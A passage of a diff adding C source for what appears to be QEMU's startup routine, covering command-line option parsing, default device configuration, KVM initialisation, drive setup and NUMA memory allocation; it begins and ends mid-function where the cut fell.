+            case QEMU_OPTION_nodefconfig:
+                defconfig=0;
+                break;
+            }
+        }
+    }
+
+    if (defconfig) {
+        int ret;
+
+        ret = qemu_read_config_file(CONFIG_QEMU_CONFDIR "/qemu.conf");
+        if (ret < 0 && ret != -ENOENT) {
+            exit(1);
+        }
+
+        ret = qemu_read_config_file(arch_config_name);
+        if (ret < 0 && ret != -ENOENT) {
+            exit(1);
+        }
+    }
+    cpudef_init();
+
+    /* second pass of option parsing */
+    optind = 1;
+    for(;;) {
+        if (optind >= argc)
+            break;
+        if (argv[optind][0] != '-') {
+	    hda_opts = drive_add(IF_DEFAULT, 0, argv[optind++], HD_OPTS);
+        } else {
+            const QEMUOption *popt;
+
+            popt = lookup_opt(argc, argv, &optarg, &optind);
+            if (!(popt->arch_mask & arch_type)) {
+                printf("Option %s not supported for this target\n", popt->name);
+                exit(1);
+            }
+            switch(popt->index) {
+            case QEMU_OPTION_M:
+                machine = find_machine(optarg);
+                if (!machine) {
+                    QEMUMachine *m;
+                    printf("Supported machines are:\n");
+                    for(m = first_machine; m != NULL; m = m->next) {
+                        if (m->alias)
+                            printf("%-10s %s (alias of %s)\n",
+                                   m->alias, m->desc, m->name);
+                        printf("%-10s %s%s\n",
+                               m->name, m->desc,
+                               m->is_default ? " (default)" : "");
+                    }
+                    exit(*optarg != '?');
+                }
+                break;
+            case QEMU_OPTION_cpu:
+                /* hw initialization will check this */
+                if (*optarg == '?') {
+                    list_cpus(stdout, &fprintf, optarg);
+                    exit(0);
+                } else {
+                    cpu_model = optarg;
+                }
+                break;
+            case QEMU_OPTION_initrd:
+                initrd_filename = optarg;
+                break;
+            case QEMU_OPTION_hda:
+                {
+                    char buf[256];
+                    if (cyls == 0)
+                        snprintf(buf, sizeof(buf), "%s", HD_OPTS);
+                    else
+                        snprintf(buf, sizeof(buf),
+                                 "%s,cyls=%d,heads=%d,secs=%d%s",
+                                 HD_OPTS , cyls, heads, secs,
+                                 translation == BIOS_ATA_TRANSLATION_LBA ?
+                                 ",trans=lba" :
+                                 translation == BIOS_ATA_TRANSLATION_NONE ?
+                                 ",trans=none" : "");
+                    drive_add(IF_DEFAULT, 0, optarg, buf);
+                    break;
+                }
+            case QEMU_OPTION_hdb:
+            case QEMU_OPTION_hdc:
+            case QEMU_OPTION_hdd:
+                drive_add(IF_DEFAULT, popt->index - QEMU_OPTION_hda, optarg,
+                          HD_OPTS);
+                break;
+            case QEMU_OPTION_drive:
+                drive_def(optarg);
+	        break;
+            case QEMU_OPTION_set:
+                if (qemu_set_option(optarg) != 0)
+                    exit(1);
+	        break;
+            case QEMU_OPTION_global:
+                if (qemu_global_option(optarg) != 0)
+                    exit(1);
+	        break;
+            case QEMU_OPTION_mtdblock:
+                drive_add(IF_MTD, -1, optarg, MTD_OPTS);
+                break;
+            case QEMU_OPTION_sd:
+                drive_add(IF_SD, 0, optarg, SD_OPTS);
+                break;
+            case QEMU_OPTION_pflash:
+                drive_add(IF_PFLASH, -1, optarg, PFLASH_OPTS);
+                break;
+            case QEMU_OPTION_snapshot:
+                snapshot = 1;
+                break;
+            case QEMU_OPTION_hdachs:
+                {
+                    const char *p;
+                    p = optarg;
+                    cyls = strtol(p, (char **)&p, 0);
+                    if (cyls < 1 || cyls > 16383)
+                        goto chs_fail;
+                    if (*p != ',')
+                        goto chs_fail;
+                    p++;
+                    heads = strtol(p, (char **)&p, 0);
+                    if (heads < 1 || heads > 16)
+                        goto chs_fail;
+                    if (*p != ',')
+                        goto chs_fail;
+                    p++;
+                    secs = strtol(p, (char **)&p, 0);
+                    if (secs < 1 || secs > 63)
+                        goto chs_fail;
+                    if (*p == ',') {
+                        p++;
+                        if (!strcmp(p, "none"))
+                            translation = BIOS_ATA_TRANSLATION_NONE;
+                        else if (!strcmp(p, "lba"))
+                            translation = BIOS_ATA_TRANSLATION_LBA;
+                        else if (!strcmp(p, "auto"))
+                            translation = BIOS_ATA_TRANSLATION_AUTO;
+                        else
+                            goto chs_fail;
+                    } else if (*p != '\0') {
+                    chs_fail:
+                        fprintf(stderr, "qemu: invalid physical CHS format\n");
+                        exit(1);
+                    }
+		    if (hda_opts != NULL) {
+                        char num[16];
+                        snprintf(num, sizeof(num), "%d", cyls);
+                        qemu_opt_set(hda_opts, "cyls", num);
+                        snprintf(num, sizeof(num), "%d", heads);
+                        qemu_opt_set(hda_opts, "heads", num);
+                        snprintf(num, sizeof(num), "%d", secs);
+                        qemu_opt_set(hda_opts, "secs", num);
+                        if (translation == BIOS_ATA_TRANSLATION_LBA)
+                            qemu_opt_set(hda_opts, "trans", "lba");
+                        if (translation == BIOS_ATA_TRANSLATION_NONE)
+                            qemu_opt_set(hda_opts, "trans", "none");
+                    }
+                }
+                break;
+            case QEMU_OPTION_numa:
+                if (nb_numa_nodes >= MAX_NODES) {
+                    fprintf(stderr, "qemu: too many NUMA nodes\n");
+                    exit(1);
+                }
+                numa_add(optarg);
+                break;
+            case QEMU_OPTION_nographic:
+                display_type = DT_NOGRAPHIC;
+                break;
+#ifdef CONFIG_CURSES
+            case QEMU_OPTION_curses:
+                display_type = DT_CURSES;
+                break;
+#endif
+            case QEMU_OPTION_portrait:
+                graphic_rotate = 1;
+                break;
+            case QEMU_OPTION_kernel:
+                kernel_filename = optarg;
+                break;
+            case QEMU_OPTION_append:
+                kernel_cmdline = optarg;
+                break;
+            case QEMU_OPTION_cdrom:
+                drive_add(IF_DEFAULT, 2, optarg, CDROM_OPTS);
+                break;
+            case QEMU_OPTION_boot:
+                {
+                    static const char * const params[] = {
+                        "order", "once", "menu", NULL
+                    };
+                    char buf[sizeof(boot_devices)];
+                    char *standard_boot_devices;
+                    int legacy = 0;
+
+                    if (!strchr(optarg, '=')) {
+                        legacy = 1;
+                        pstrcpy(buf, sizeof(buf), optarg);
+                    } else if (check_params(buf, sizeof(buf), params, optarg) < 0) {
+                        fprintf(stderr,
+                                "qemu: unknown boot parameter '%s' in '%s'\n",
+                                buf, optarg);
+                        exit(1);
+                    }
+
+                    if (legacy ||
+                        get_param_value(buf, sizeof(buf), "order", optarg)) {
+                        validate_bootdevices(buf);
+                        pstrcpy(boot_devices, sizeof(boot_devices), buf);
+                    }
+                    if (!legacy) {
+                        if (get_param_value(buf, sizeof(buf),
+                                            "once", optarg)) {
+                            validate_bootdevices(buf);
+                            standard_boot_devices = qemu_strdup(boot_devices);
+                            pstrcpy(boot_devices, sizeof(boot_devices), buf);
+                            qemu_register_reset(restore_boot_devices,
+                                                standard_boot_devices);
+                        }
+                        if (get_param_value(buf, sizeof(buf),
+                                            "menu", optarg)) {
+                            if (!strcmp(buf, "on")) {
+                                boot_menu = 1;
+                            } else if (!strcmp(buf, "off")) {
+                                boot_menu = 0;
+                            } else {
+                                fprintf(stderr,
+                                        "qemu: invalid option value '%s'\n",
+                                        buf);
+                                exit(1);
+                            }
+                        }
+                    }
+                }
+                break;
+            case QEMU_OPTION_fda:
+            case QEMU_OPTION_fdb:
+                drive_add(IF_FLOPPY, popt->index - QEMU_OPTION_fda,
+                          optarg, FD_OPTS);
+                break;
+            case QEMU_OPTION_no_fd_bootchk:
+                fd_bootchk = 0;
+                break;
+            case QEMU_OPTION_netdev:
+                if (net_client_parse(qemu_find_opts("netdev"), optarg) == -1) {
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_net:
+                if (net_client_parse(qemu_find_opts("net"), optarg) == -1) {
+                    exit(1);
+                }
+                break;
+#ifdef CONFIG_SLIRP
+            case QEMU_OPTION_tftp:
+                legacy_tftp_prefix = optarg;
+                break;
+            case QEMU_OPTION_bootp:
+                legacy_bootp_filename = optarg;
+                break;
+            case QEMU_OPTION_redir:
+                if (net_slirp_redir(optarg) < 0)
+                    exit(1);
+                break;
+#endif
+            case QEMU_OPTION_bt:
+                add_device_config(DEV_BT, optarg);
+                break;
+            case QEMU_OPTION_audio_help:
+                if (!(audio_available())) {
+                    printf("Option %s not supported for this target\n", popt->name);
+                    exit(1);
+                }
+                AUD_help ();
+                exit (0);
+                break;
+            case QEMU_OPTION_soundhw:
+                if (!(audio_available())) {
+                    printf("Option %s not supported for this target\n", popt->name);
+                    exit(1);
+                }
+                select_soundhw (optarg);
+                break;
+            case QEMU_OPTION_h:
+                help(0);
+                break;
+            case QEMU_OPTION_version:
+                version();
+                exit(0);
+                break;
+            case QEMU_OPTION_m: {
+                int64_t value;
+
+                value = strtosz(optarg, NULL);
+                if (value < 0) {
+                    fprintf(stderr, "qemu: invalid ram size: %s\n", optarg);
+                    exit(1);
+                }
+
+                /* On 32-bit hosts, QEMU is limited by virtual address space */
+                if (value > (2047 << 20) && HOST_LONG_BITS == 32) {
+                    fprintf(stderr, "qemu: at most 2047 MB RAM can be simulated\n");
+                    exit(1);
+                }
+                if (value != (uint64_t)(ram_addr_t)value) {
+                    fprintf(stderr, "qemu: ram size too large\n");
+                    exit(1);
+                }
+                ram_size = value;
+                break;
+            }
+            case QEMU_OPTION_mempath:
+                mem_path = optarg;
+                break;
+#ifdef MAP_POPULATE
+            case QEMU_OPTION_mem_prealloc:
+                mem_prealloc = 1;
+                break;
+#endif
+            case QEMU_OPTION_d:
+                set_cpu_log(optarg);
+                break;
+            case QEMU_OPTION_s:
+                gdbstub_dev = "tcp::" DEFAULT_GDBSTUB_PORT;
+                break;
+            case QEMU_OPTION_gdb:
+                gdbstub_dev = optarg;
+                break;
+            case QEMU_OPTION_L:
+                data_dir = optarg;
+                break;
+            case QEMU_OPTION_bios:
+                bios_name = optarg;
+                break;
+            case QEMU_OPTION_singlestep:
+                singlestep = 1;
+                break;
+            case QEMU_OPTION_S:
+                autostart = 0;
+                break;
+	    case QEMU_OPTION_k:
+		keyboard_layout = optarg;
+		break;
+            case QEMU_OPTION_localtime:
+                rtc_utc = 0;
+                break;
+            case QEMU_OPTION_vga:
+                select_vgahw (optarg);
+                break;
+            case QEMU_OPTION_g:
+                {
+                    const char *p;
+                    int w, h, depth;
+                    p = optarg;
+                    w = strtol(p, (char **)&p, 10);
+                    if (w <= 0) {
+                    graphic_error:
+                        fprintf(stderr, "qemu: invalid resolution or depth\n");
+                        exit(1);
+                    }
+                    if (*p != 'x')
+                        goto graphic_error;
+                    p++;
+                    h = strtol(p, (char **)&p, 10);
+                    if (h <= 0)
+                        goto graphic_error;
+                    if (*p == 'x') {
+                        p++;
+                        depth = strtol(p, (char **)&p, 10);
+                        if (depth != 8 && depth != 15 && depth != 16 &&
+                            depth != 24 && depth != 32)
+                            goto graphic_error;
+                    } else if (*p == '\0') {
+                        depth = graphic_depth;
+                    } else {
+                        goto graphic_error;
+                    }
+
+                    graphic_width = w;
+                    graphic_height = h;
+                    graphic_depth = depth;
+                }
+                break;
+            case QEMU_OPTION_echr:
+                {
+                    char *r;
+                    term_escape_char = strtol(optarg, &r, 0);
+                    if (r == optarg)
+                        printf("Bad argument to echr\n");
+                    break;
+                }
+            case QEMU_OPTION_monitor:
+                monitor_parse(optarg, "readline");
+                default_monitor = 0;
+                break;
+            case QEMU_OPTION_qmp:
+                monitor_parse(optarg, "control");
+                default_monitor = 0;
+                break;
+            case QEMU_OPTION_mon:
+                opts = qemu_opts_parse(qemu_find_opts("mon"), optarg, 1);
+                if (!opts) {
+                    exit(1);
+                }
+                default_monitor = 0;
+                break;
+            case QEMU_OPTION_chardev:
+                opts = qemu_opts_parse(qemu_find_opts("chardev"), optarg, 1);
+                if (!opts) {
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_fsdev:
+                olist = qemu_find_opts("fsdev");
+                if (!olist) {
+                    fprintf(stderr, "fsdev is not supported by this qemu build.\n");
+                    exit(1);
+                }
+                opts = qemu_opts_parse(olist, optarg, 1);
+                if (!opts) {
+                    fprintf(stderr, "parse error: %s\n", optarg);
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_virtfs: {
+                char *arg_fsdev = NULL;
+                char *arg_9p = NULL;
+                int len = 0;
+
+                olist = qemu_find_opts("virtfs");
+                if (!olist) {
+                    fprintf(stderr, "virtfs is not supported by this qemu build.\n");
+                    exit(1);
+                }
+                opts = qemu_opts_parse(olist, optarg, 1);
+                if (!opts) {
+                    fprintf(stderr, "parse error: %s\n", optarg);
+                    exit(1);
+                }
+
+                if (qemu_opt_get(opts, "fstype") == NULL ||
+                        qemu_opt_get(opts, "mount_tag") == NULL ||
+                        qemu_opt_get(opts, "path") == NULL ||
+                        qemu_opt_get(opts, "security_model") == NULL) {
+                    fprintf(stderr, "Usage: -virtfs fstype,path=/share_path/,"
+                            "security_model=[mapped|passthrough|none],"
+                            "mnt_tag=tag.\n");
+                    exit(1);
+                }
+
+                len = strlen(",id=,path=,security_model=");
+                len += strlen(qemu_opt_get(opts, "fstype"));
+                len += strlen(qemu_opt_get(opts, "mount_tag"));
+                len += strlen(qemu_opt_get(opts, "path"));
+                len += strlen(qemu_opt_get(opts, "security_model"));
+                arg_fsdev = qemu_malloc((len + 1) * sizeof(*arg_fsdev));
+
+                snprintf(arg_fsdev, (len + 1) * sizeof(*arg_fsdev),
+                         "%s,id=%s,path=%s,security_model=%s",
+                         qemu_opt_get(opts, "fstype"),
+                         qemu_opt_get(opts, "mount_tag"),
+                         qemu_opt_get(opts, "path"),
+                         qemu_opt_get(opts, "security_model"));
+
+                len = strlen("virtio-9p-pci,fsdev=,mount_tag=");
+                len += 2*strlen(qemu_opt_get(opts, "mount_tag"));
+                arg_9p = qemu_malloc((len + 1) * sizeof(*arg_9p));
+
+                snprintf(arg_9p, (len + 1) * sizeof(*arg_9p),
+                         "virtio-9p-pci,fsdev=%s,mount_tag=%s",
+                         qemu_opt_get(opts, "mount_tag"),
+                         qemu_opt_get(opts, "mount_tag"));
+
+                if (!qemu_opts_parse(qemu_find_opts("fsdev"), arg_fsdev, 1)) {
+                    fprintf(stderr, "parse error [fsdev]: %s\n", optarg);
+                    exit(1);
+                }
+
+                if (!qemu_opts_parse(qemu_find_opts("device"), arg_9p, 1)) {
+                    fprintf(stderr, "parse error [device]: %s\n", optarg);
+                    exit(1);
+                }
+
+                qemu_free(arg_fsdev);
+                qemu_free(arg_9p);
+                break;
+            }
+            case QEMU_OPTION_serial:
+                add_device_config(DEV_SERIAL, optarg);
+                default_serial = 0;
+                if (strncmp(optarg, "mon:", 4) == 0) {
+                    default_monitor = 0;
+                }
+                break;
+            case QEMU_OPTION_watchdog:
+                if (watchdog) {
+                    fprintf(stderr,
+                            "qemu: only one watchdog option may be given\n");
+                    return 1;
+                }
+                watchdog = optarg;
+                break;
+            case QEMU_OPTION_watchdog_action:
+                if (select_watchdog_action(optarg) == -1) {
+                    fprintf(stderr, "Unknown -watchdog-action parameter\n");
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_virtiocon:
+                add_device_config(DEV_VIRTCON, optarg);
+                default_virtcon = 0;
+                if (strncmp(optarg, "mon:", 4) == 0) {
+                    default_monitor = 0;
+                }
+                break;
+            case QEMU_OPTION_parallel:
+                add_device_config(DEV_PARALLEL, optarg);
+                default_parallel = 0;
+                if (strncmp(optarg, "mon:", 4) == 0) {
+                    default_monitor = 0;
+                }
+                break;
+            case QEMU_OPTION_debugcon:
+                add_device_config(DEV_DEBUGCON, optarg);
+                break;
+	    case QEMU_OPTION_loadvm:
+		loadvm = optarg;
+		break;
+            case QEMU_OPTION_full_screen:
+                full_screen = 1;
+                break;
+#ifdef CONFIG_SDL
+            case QEMU_OPTION_no_frame:
+                no_frame = 1;
+                break;
+            case QEMU_OPTION_alt_grab:
+                alt_grab = 1;
+                break;
+            case QEMU_OPTION_ctrl_grab:
+                ctrl_grab = 1;
+                break;
+            case QEMU_OPTION_no_quit:
+                no_quit = 1;
+                break;
+            case QEMU_OPTION_sdl:
+                display_type = DT_SDL;
+                break;
+#endif
+            case QEMU_OPTION_pidfile:
+                pid_file = optarg;
+                break;
+            case QEMU_OPTION_win2k_hack:
+                win2k_install_hack = 1;
+                break;
+            case QEMU_OPTION_rtc_td_hack:
+                rtc_td_hack = 1;
+                break;
+            case QEMU_OPTION_acpitable:
+                do_acpitable_option(optarg);
+                break;
+            case QEMU_OPTION_smbios:
+                do_smbios_option(optarg);
+                break;
+            case QEMU_OPTION_enable_kvm:
+                kvm_allowed = 1;
+                break;
+	    case QEMU_OPTION_no_kvm:
+		kvm_allowed = 0;
+#ifdef CONFIG_NO_CPU_EMULATION
+                fprintf(stderr, "cpu emulation not configured\n");
+                exit(1);
+#endif
+		break;
+#ifdef CONFIG_KVM
+	    case QEMU_OPTION_no_kvm_irqchip: {
+		kvm_irqchip = 0;
+		kvm_pit = 0;
+		break;
+	    }
+	    case QEMU_OPTION_no_kvm_pit: {
+		kvm_pit = 0;
+		break;
+	    }
+            case QEMU_OPTION_no_kvm_pit_reinjection: {
+                kvm_pit_reinject = 0;
+                break;
+            }
+	    case QEMU_OPTION_enable_nesting: {
+		kvm_nested = 1;
+		break;
+	    }
+#endif
+            case QEMU_OPTION_usb:
+                usb_enabled = 1;
+                break;
+            case QEMU_OPTION_usbdevice:
+                usb_enabled = 1;
+                add_device_config(DEV_USB, optarg);
+                break;
+            case QEMU_OPTION_device:
+                if (!qemu_opts_parse(qemu_find_opts("device"), optarg, 1)) {
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_smp:
+                smp_parse(optarg);
+                if (smp_cpus < 1) {
+                    fprintf(stderr, "Invalid number of CPUs\n");
+                    exit(1);
+                }
+                if (max_cpus < smp_cpus) {
+                    fprintf(stderr, "maxcpus must be equal to or greater than "
+                            "smp\n");
+                    exit(1);
+                }
+                if (max_cpus > 255) {
+                    fprintf(stderr, "Unsupported number of maxcpus\n");
+                    exit(1);
+                }
+                break;
+	    case QEMU_OPTION_vnc:
+                display_remote++;
+		vnc_display = optarg;
+		break;
+            case QEMU_OPTION_no_acpi:
+                acpi_enabled = 0;
+                break;
+            case QEMU_OPTION_no_hpet:
+                no_hpet = 1;
+                break;
+            case QEMU_OPTION_balloon:
+                if (balloon_parse(optarg) < 0) {
+                    fprintf(stderr, "Unknown -balloon argument %s\n", optarg);
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_no_reboot:
+                no_reboot = 1;
+                break;
+            case QEMU_OPTION_no_shutdown:
+                no_shutdown = 1;
+                break;
+            case QEMU_OPTION_show_cursor:
+                cursor_hide = 0;
+                break;
+            case QEMU_OPTION_uuid:
+                if(qemu_uuid_parse(optarg, qemu_uuid) < 0) {
+                    fprintf(stderr, "Fail to parse UUID string."
+                            " Wrong format.\n");
+                    exit(1);
+                }
+                break;
+	    case QEMU_OPTION_option_rom:
+		if (nb_option_roms >= MAX_OPTION_ROMS) {
+		    fprintf(stderr, "Too many option ROMs\n");
+		    exit(1);
+		}
+                opts = qemu_opts_parse(qemu_find_opts("option-rom"), optarg, 1);
+                option_rom[nb_option_roms].name = qemu_opt_get(opts, "romfile");
+                option_rom[nb_option_roms].bootindex =
+                    qemu_opt_get_number(opts, "bootindex", -1);
+                if (!option_rom[nb_option_roms].name) {
+                    fprintf(stderr, "Option ROM file is not specified\n");
+                    exit(1);
+                }
+		nb_option_roms++;
+		break;
+            case QEMU_OPTION_semihosting:
+                semihosting_enabled = 1;
+                break;
+            case QEMU_OPTION_tdf:
+                time_drift_fix = 1;
+		break;
+            case QEMU_OPTION_kvm_shadow_memory:
+                kvm_shadow_memory = (int64_t)atoi(optarg) * 1024 * 1024 / 4096;
+                break;
+            case QEMU_OPTION_name:
+                qemu_name = qemu_strdup(optarg);
+		 {
+		     char *p = strchr(qemu_name, ',');
+		     if (p != NULL) {
+		        *p++ = 0;
+			if (strncmp(p, "process=", 8)) {
+			    fprintf(stderr, "Unknown subargument %s to -name\n", p);
+			    exit(1);
+			}
+			p += 8;
+			os_set_proc_name(p);
+		     }	
+		 }	
+                break;
+            case QEMU_OPTION_prom_env:
+                if (nb_prom_envs >= MAX_PROM_ENVS) {
+                    fprintf(stderr, "Too many prom variables\n");
+                    exit(1);
+                }
+                prom_envs[nb_prom_envs] = optarg;
+                nb_prom_envs++;
+                break;
+            case QEMU_OPTION_old_param:
+                old_param = 1;
+                break;
+            case QEMU_OPTION_clock:
+                configure_alarms(optarg);
+                break;
+            case QEMU_OPTION_startdate:
+                configure_rtc_date_offset(optarg, 1);
+                break;
+            case QEMU_OPTION_rtc:
+                opts = qemu_opts_parse(qemu_find_opts("rtc"), optarg, 0);
+                if (!opts) {
+                    exit(1);
+                }
+                configure_rtc(opts);
+                break;
+            case QEMU_OPTION_tb_size:
+                tb_size = strtol(optarg, NULL, 0);
+                if (tb_size < 0)
+                    tb_size = 0;
+                break;
+            case QEMU_OPTION_icount:
+                icount_option = optarg;
+                break;
+            case QEMU_OPTION_incoming:
+                incoming = optarg;
+                incoming_expected = true;
+                break;
+            case QEMU_OPTION_nodefaults:
+                default_serial = 0;
+                default_parallel = 0;
+                default_virtcon = 0;
+                default_monitor = 0;
+                default_vga = 0;
+                default_net = 0;
+                default_floppy = 0;
+                default_cdrom = 0;
+                default_sdcard = 0;
+                break;
+#ifndef _WIN32
+            case QEMU_OPTION_nvram:
+                nvram = optarg;
+                break;
+#endif
+            case QEMU_OPTION_xen_domid:
+                if (!(xen_available())) {
+                    printf("Option %s not supported for this target\n", popt->name);
+                    exit(1);
+                }
+                xen_domid = atoi(optarg);
+                break;
+            case QEMU_OPTION_xen_create:
+                if (!(xen_available())) {
+                    printf("Option %s not supported for this target\n", popt->name);
+                    exit(1);
+                }
+                xen_mode = XEN_CREATE;
+                break;
+            case QEMU_OPTION_xen_attach:
+                if (!(xen_available())) {
+                    printf("Option %s not supported for this target\n", popt->name);
+                    exit(1);
+                }
+                xen_mode = XEN_ATTACH;
+                break;
+#ifdef CONFIG_SIMPLE_TRACE
+            case QEMU_OPTION_trace:
+                opts = qemu_opts_parse(qemu_find_opts("trace"), optarg, 0);
+                if (opts) {
+                    trace_file = qemu_opt_get(opts, "file");
+                }
+                break;
+#endif
+            case QEMU_OPTION_readconfig:
+                {
+                    int ret = qemu_read_config_file(optarg);
+                    if (ret < 0) {
+                        fprintf(stderr, "read config %s: %s\n", optarg,
+                            strerror(-ret));
+                        exit(1);
+                    }
+                    break;
+                }
+            case QEMU_OPTION_spice:
+                olist = qemu_find_opts("spice");
+                if (!olist) {
+                    fprintf(stderr, "spice is not supported by this qemu build.\n");
+                    exit(1);
+                }
+                opts = qemu_opts_parse(olist, optarg, 0);
+                if (!opts) {
+                    fprintf(stderr, "parse error: %s\n", optarg);
+                    exit(1);
+                }
+                break;
+            case QEMU_OPTION_writeconfig:
+                {
+                    FILE *fp;
+                    if (strcmp(optarg, "-") == 0) {
+                        fp = stdout;
+                    } else {
+                        fp = fopen(optarg, "w");
+                        if (fp == NULL) {
+                            fprintf(stderr, "open %s: %s\n", optarg, strerror(errno));
+                            exit(1);
+                        }
+                    }
+                    qemu_config_write(fp);
+                    fclose(fp);
+                    break;
+                }
+            default:
+                os_parse_cmd_args(popt->index, optarg);
+            }
+        }
+    }
+    loc_set_none();
+
+    /* If no data_dir is specified then try to find it relative to the
+       executable path.  */
+    if (!data_dir) {
+        data_dir = os_find_datadir(argv[0]);
+    }
+    /* If all else fails use the install patch specified when building.  */
+    if (!data_dir) {
+        data_dir = CONFIG_QEMU_DATADIR;
+    }
+
+#ifdef CONFIG_SIMPLE_TRACE
+    /*
+     * Set the trace file name, if specified.
+     */
+    st_set_trace_file(trace_file);
+#endif
+    /*
+     * Default to max_cpus = smp_cpus, in case the user doesn't
+     * specify a max_cpus value.
+     */
+    if (!max_cpus)
+        max_cpus = smp_cpus;
+
+    machine->max_cpus = machine->max_cpus ?: 1; /* Default to UP */
+    if (smp_cpus > machine->max_cpus) {
+        fprintf(stderr, "Number of SMP cpus requested (%d), exceeds max cpus "
+                "supported by machine `%s' (%d)\n", smp_cpus,  machine->name,
+                machine->max_cpus);
+        exit(1);
+    }
+
+    qemu_opts_foreach(qemu_find_opts("device"), default_driver_check, NULL, 0);
+    qemu_opts_foreach(qemu_find_opts("global"), default_driver_check, NULL, 0);
+
+    if (machine->no_serial) {
+        default_serial = 0;
+    }
+    if (machine->no_parallel) {
+        default_parallel = 0;
+    }
+    if (!machine->use_virtcon) {
+        default_virtcon = 0;
+    }
+    if (machine->no_vga) {
+        default_vga = 0;
+    }
+    if (machine->no_floppy) {
+        default_floppy = 0;
+    }
+    if (machine->no_cdrom) {
+        default_cdrom = 0;
+    }
+    if (machine->no_sdcard) {
+        default_sdcard = 0;
+    }
+
+    if (display_type == DT_NOGRAPHIC) {
+        if (default_parallel)
+            add_device_config(DEV_PARALLEL, "null");
+        if (default_serial && default_monitor) {
+            add_device_config(DEV_SERIAL, "mon:stdio");
+        } else if (default_virtcon && default_monitor) {
+            add_device_config(DEV_VIRTCON, "mon:stdio");
+        } else {
+            if (default_serial)
+                add_device_config(DEV_SERIAL, "stdio");
+            if (default_virtcon)
+                add_device_config(DEV_VIRTCON, "stdio");
+            if (default_monitor)
+                monitor_parse("stdio", "readline");
+        }
+    } else {
+        if (default_serial)
+            add_device_config(DEV_SERIAL, "vc:80Cx24C");
+        if (default_parallel)
+            add_device_config(DEV_PARALLEL, "vc:80Cx24C");
+        if (default_monitor)
+            monitor_parse("vc:80Cx24C", "readline");
+        if (default_virtcon)
+            add_device_config(DEV_VIRTCON, "vc:80Cx24C");
+    }
+    if (default_vga)
+        vga_interface_type = VGA_CIRRUS;
+
+    socket_init();
+
+    if (qemu_opts_foreach(qemu_find_opts("chardev"), chardev_init_func, NULL, 1) != 0)
+        exit(1);
+#ifdef CONFIG_VIRTFS
+    if (qemu_opts_foreach(qemu_find_opts("fsdev"), fsdev_init_func, NULL, 1) != 0) {
+        exit(1);
+    }
+#endif
+
+    os_daemonize();
+
+    if (pid_file && qemu_create_pidfile(pid_file) != 0) {
+        os_pidfile_error();
+        exit(1);
+    }
+
+    if (kvm_allowed) {
+        int ret = kvm_init();
+        if (ret < 0) {
+            if (kvm_allowed > 0) {
+                if (!kvm_available()) {
+                    printf("KVM not supported for this target\n");
+                } else {
+                    fprintf(stderr, "failed to initialize KVM: %s\n", strerror(-ret));
+                }
+                exit(1);
+            }
+            fprintf(stderr, "Could not initialize KVM, will disable KVM support\n");
+        }
+        kvm_allowed = ret >= 0;
+    }
+
+    if (qemu_init_main_loop()) {
+        fprintf(stderr, "qemu_init_main_loop failed\n");
+        exit(1);
+    }
+    linux_boot = (kernel_filename != NULL);
+
+    if (!linux_boot && *kernel_cmdline != '\0') {
+        fprintf(stderr, "-append only allowed with -kernel option\n");
+        exit(1);
+    }
+
+    if (!linux_boot && initrd_filename != NULL) {
+        fprintf(stderr, "-initrd only allowed with -kernel option\n");
+        exit(1);
+    }
+
+    os_set_line_buffering();
+
+    if (init_timer_alarm() < 0) {
+        fprintf(stderr, "could not initialize alarm timer\n");
+        exit(1);
+    }
+    configure_icount(icount_option);
+
+    if (net_init_clients() < 0) {
+        exit(1);
+    }
+
+    /* init the bluetooth world */
+    if (foreach_device_config(DEV_BT, bt_parse))
+        exit(1);
+
+    /* init the memory */
+    if (ram_size == 0)
+        ram_size = DEFAULT_RAM_SIZE * 1024 * 1024;
+
+    /* init the dynamic translator */
+    cpu_exec_init_all(tb_size * 1024 * 1024);
+
+    bdrv_init_with_whitelist();
+
+    blk_mig_init();
+
+    /* open the virtual block devices */
+    if (snapshot)
+        qemu_opts_foreach(qemu_find_opts("drive"), drive_enable_snapshot, NULL, 0);
+    if (qemu_opts_foreach(qemu_find_opts("drive"), drive_init_func, &machine->use_scsi, 1) != 0)
+        exit(1);
+
+    default_drive(default_cdrom, snapshot, machine->use_scsi,
+                  IF_DEFAULT, 2, CDROM_OPTS);
+    default_drive(default_floppy, snapshot, machine->use_scsi,
+                  IF_FLOPPY, 0, FD_OPTS);
+    default_drive(default_sdcard, snapshot, machine->use_scsi,
+                  IF_SD, 0, SD_OPTS);
+
+    register_savevm_live(NULL, "ram", 0, 4, NULL, ram_save_live, NULL,
+                         ram_load, NULL);
+
+    if (nb_numa_nodes > 0) {
+        int i;
+
+        if (nb_numa_nodes > smp_cpus) {
+            nb_numa_nodes = smp_cpus;
+        }
+
+        /* If no memory size if given for any node, assume the default case
+         * and distribute the available memory equally across all nodes
+         */
+        for (i = 0; i < nb_numa_nodes; i++) {
+            if (node_mem[i] != 0)
+                break;
+        }
+        if (i == nb_numa_nodes) {
+            uint64_t usedmem = 0;
+
+            /* On Linux, the each node's border has to be 8MB aligned,
+             * the final node gets the rest.
+             */
+            for (i = 0; i < nb_numa_nodes - 1; i++) {
+                node_mem[i] = (ram_size / nb_numa_nodes) & ~((1 << 23UL) - 1);
+                usedmem += node_mem[i];
+            }
+            node_mem[i] = ram_size - usedmem;
+        }
+
+        for (i = 0; i < nb_numa_nodes; i++) {
+            if (node_cpumask[i] != 0)
+                break;
+        }
+        /* assigning the VCPUs round-robin is easier to implement, guest OSes
+         * must cope with this anyway, because there are BIOSes out there in
+         * real machines which also use this scheme.
+         */
+        if (i == nb_numa_nodes) {
+            for (i = 0; i < smp_cpus; i++) {
+                node_cpumask[i % nb_numa_nodes] |= 1 << i;
+            }
+        }
+    }
+
+    if (qemu_opts_foreach(qemu_find_opts("mon"), mon_init_func, NULL, 1) != 0) {
+        exit(1);
+    }
+
+    if (foreach_device_config(DEV_SERIAL, serial_parse) < 0)
+        exit(1);
+    if (foreach_device_config(DEV_PARALLEL, parallel_parse) < 0)
+        exit(1);
+    if (foreach_device_config(DEV_VIRTCON, virtcon_parse) < 0)
+        exit(1);
+    if (foreach_device_config(DEV_DEBUGCON, debugcon_parse) < 0)
+        exit(1);
+
+    module_call_init(MODULE_INIT_DEVICE);
+
+    if (qemu_opts_foreach(qemu_find_opts("device"), device_help_func, NULL, 0) != 0)
+        exit(0);
+
+    if (watchdog) {
